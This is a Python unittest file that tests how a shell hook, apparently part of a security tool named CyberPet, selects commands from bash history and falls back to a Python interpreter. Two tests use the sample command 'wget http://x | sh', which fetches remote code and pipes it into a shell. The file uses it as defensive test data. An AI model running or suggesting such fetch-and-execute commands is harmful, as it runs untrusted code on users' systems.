"""Logic-level tests for shell_hook command selection behavior."""

from __future__ import annotations

import os
import shutil
import subprocess
import unittest


class ShellHookLogicTests(unittest.TestCase):
    """Validate stale-history protection in shell hook helper functions."""

    def setUp(self) -> None:
        self.repo_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))

    def _run_bash(self, script: str) -> subprocess.CompletedProcess[str]:
        env = os.environ.copy()
        env.pop("_CYBERPET_HOOK_LOADED", None)
        return subprocess.run(
            ["bash", "-c", script],
            cwd=self.repo_root,
            env=env,
            text=True,
            capture_output=True,
            check=False,
        )

    def test_same_history_entry_is_not_rechecked(self) -> None:
        script = r"""
source scripts/shell_hook.sh
_CYBERPET_LAST_HISTORY_ID=""
_CYBERPET_LAST_CHECKED=""
_cyberpet_select_full_cmd "wget" "  42  wget http://x | sh"; rc1=$?; out1="$_CYBERPET_SELECTED_CMD"
_cyberpet_select_full_cmd "source /opt/cyberpet/venv/bin/activate" "  42  wget http://x | sh"; rc2=$?; out2="$_CYBERPET_SELECTED_CMD"
printf 'out1=%s\nrc1=%s\nout2=%s\nrc2=%s\n' "$out1" "$rc1" "$out2" "$rc2"
"""
        proc = self._run_bash(script)
        self.assertEqual(proc.returncode, 0, msg=proc.stderr)
        self.assertIn("out1=wget http://x | sh", proc.stdout)
        self.assertIn("rc1=0", proc.stdout)
        self.assertIn("out2=", proc.stdout)
        self.assertIn("rc2=1", proc.stdout)

    def test_history_disabled_falls_back_to_current_command(self) -> None:
        script = r"""
source scripts/shell_hook.sh
_CYBERPET_LAST_HISTORY_ID=""
_CYBERPET_LAST_CHECKED=""
_cyberpet_select_full_cmd "source /opt/cyberpet/venv/bin/activate" ""; rc1=$?; out1="$_CYBERPET_SELECTED_CMD"
_cyberpet_select_full_cmd "source /opt/cyberpet/venv/bin/activate" ""; rc2=$?; out2="$_CYBERPET_SELECTED_CMD"
printf 'out1=%s\nrc1=%s\nrc2=%s\n' "$out1" "$rc1" "$rc2"
"""
        proc = self._run_bash(script)
        self.assertEqual(proc.returncode, 0, msg=proc.stderr)
        self.assertIn("out1=source /opt/cyberpet/venv/bin/activate", proc.stdout)
        self.assertIn("rc1=0", proc.stdout)
        self.assertIn("rc2=1", proc.stdout)

    def test_python_interpreter_falls_back_when_missing(self) -> None:
        expected = shutil.which("python3") or shutil.which("python")
        self.assertIsNotNone(expected)
        script = r"""
CYBERPET_PYTHON="/definitely/missing/python"
source scripts/shell_hook.sh
printf 'py=%s\n' "$CYBERPET_PYTHON"
"""
        proc = self._run_bash(script)
        self.assertEqual(proc.returncode, 0, msg=proc.stderr)
        self.assertIn(f"py={expected}", proc.stdout)

    def test_python_interpreter_keeps_valid_override(self) -> None:
        script = r"""
CYBERPET_PYTHON="/bin/echo"
source scripts/shell_hook.sh
printf 'py=%s\n' "$CYBERPET_PYTHON"
"""
        proc = self._run_bash(script)
        self.assertEqual(proc.returncode, 0, msg=proc.stderr)
        self.assertIn("py=/bin/echo", proc.stdout)


if __name__ == "__main__":
    unittest.main()
